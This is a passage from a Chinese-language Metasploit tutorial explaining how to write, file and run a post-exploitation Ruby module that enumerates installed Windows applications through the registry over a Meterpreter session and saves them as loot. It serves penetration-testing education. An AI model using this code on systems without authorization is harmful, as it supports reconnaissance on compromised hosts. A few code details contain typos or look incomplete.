'Name' => 'Windows Gather Installed Application Enumeration',
'Description' => %q{ This module will enumerate all installed applications },
'License' => MSF_LICENSE,
'Platform' => [ 'windows' ],
'SessionTypes' => [ 'meterpreter' ]
))
end 
```

脚本以包含 Metasploit 核心库开始。然后，我们建立了一个扩展 Msf::Post 模块属性的类。

接下来，我们创建`initialize`函数，该函数用于初始化和定义模块属性和描述。这种基本结构在几乎所有模块中都是相同的。这里需要注意的是，我们已经包含了'rex'和'registry'库。这将使框架更容易理解我们在模块中的需求。

现在，我们的下一步将是创建一个可以显示我们提取结果的表格。我们有一个特殊的库`Rex::Ui::Text`，可以用于此任务。我们将不得不定义不同的列：

```
def app_list
tbl = Rex::Ui::Text::Table.new(
'Header' => "Installed Applications",
'Indent' => 1,
'Columns' =>
[
"Name",
"Version"
])
appkeys = [
'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
]
apps = []
appkeys.each do |keyx86|
found_keys = registry_enumkeys(keyx86)
if found_keys
found_keys.each do |ak|
apps << keyx86 +"\\" + ak
end
end
end 
```

脚本主体以构建表格并提供不同的列名开始。然后，创建一个单独的注册表位置数组，该数组将用于枚举应用程序列表。该数组将包含包含有关目标计算机上安装的应用程序的信息的不同注册表条目。应用程序信息维护在一个名为`apps`的单独数组中。

然后，我们通过运行一个循环来开始枚举过程，该循环查看存储在`appskey`数组中的不同注册表位置：

```
t = []
while(not apps.empty?)
1.upto(16) do
t << framework.threads.spawn("Module(#{self.refname})", false, apps.shift) do |k|
begin
dispnm = registry_getvaldata("#{k}","DisplayName")
dispversion = registry_getvaldata("#{k}","DisplayVersion")
tbl << [dispnm,dispversion] if dispnm and dispversion
rescue
end
end

```

脚本的下一行用不同的值填充表格的相应列。脚本使用内置函数`registry_getvaldata`，该函数获取值并将其添加到表中：

```
results = tbl.to_s
print_line("\n" + results + "\n")
p = store_loot("host.applications", "text/plain", session, results, "applications.txt", "Installed Applications")
print_status("Results stored in: #{p}")
end
def run
print_status("Enumerating applications installed on #{sysinfo['Computer']}")
app_list
end
end

```

脚本的最后几行用于将信息存储在名为`applications.txt`的单独文本文件中。脚本使用`store_loot`函数将完整的表格存储在文本文件中。

最后，在屏幕上显示输出，指出文件已创建，并将结果存储在其中。

下一步将是将完整的程序存储在相应的目录中。您必须确保选择正确的目录来存储您的模块。这将有助于框架清楚地理解模块的实用性，并将维护一个层次结构。在更新模块时保持层次结构将有助于准确跟踪模块的目标。例如，将 Internet Explorer 模块保留在`modules/exploits/windows/browser`目录下，将有助于我们轻松地在此位置找到任何新的或现有的浏览器模块。

要确定模块存储位置，您应该查看以下要点：

+   模块类型

+   模块执行的操作

+   受影响的软件或操作系统

Metasploit 遵循存储模块的“通用到专用”的层次结构格式。它从模块类型开始，例如利用模块或辅助模块。然后选择一个通用名称，例如受影响的操作系统的名称。然后创建更专业的功能，例如模块用于浏览器。最后，使用最具体的命名，例如模块针对的浏览器的名称。

让我们考虑我们的模块。这个模块是一个后渗透模块，用于枚举 Windows 操作系统并收集有关系统的信息。因此，我们的模块应该遵循存储的约定。

因此，我们的目标文件夹应该是`modules/post/windows/gather/`。

你可以用你想要的名称和.a.rb 扩展名保存模块。让我们把它保存为`enum_applications.rb`。

## 它的工作原理是...

一旦我们把模块保存在它的首选目录中，下一步就是执行它，看看它是否正常工作。我们已经在之前的示例中看到了模块执行的过程。模块名称用于在 MSF 终端中执行它：

```
msf> use post/windows/gather/enum_applications
msf post(enum_applications) > show options
Module options (post/windows/gather/enum_applcations)
Name Current Setting Required Description
SESSION yes The session.. 
```

这是一个小例子，说明了如何构建和添加自己的模块到框架中。如果你想构建好的模块，你肯定需要对 Ruby 脚本有扎实的知识。你也可以通过发布你的模块来为 Metasploit 社区做出贡献，并让其他人受益。
